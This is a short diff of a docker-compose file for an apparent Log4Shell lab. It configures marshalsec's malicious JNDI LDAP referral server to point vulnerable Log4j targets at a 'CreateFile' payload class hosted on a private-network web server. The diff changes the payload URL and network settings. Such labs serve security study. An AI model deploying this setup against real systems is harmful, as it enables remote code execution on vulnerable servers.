@@ -11,13 +11,13 @@ services:
       - -cp
       - /usr/app/marshalsec-0.0.3-SNAPSHOT-all.jar
       - marshalsec.jndi.LDAPRefServer
-      - http://192.168.55.20:8888/#CreateFile
+      - http://192.168.55.20:80/exploits/#CreateFile
     restart: always
     networks:
       log4j:
         ipv4_address: 192.168.55.10
   web-server:
-    image: web-server/
+    build: web-server/
     container_name: web-server
     ports:
       - 8888:80
@@ -32,5 +32,4 @@ services:
 
 networks:
   log4j:
-    external:
-      name: socket_proxy
+    name: socket_proxy
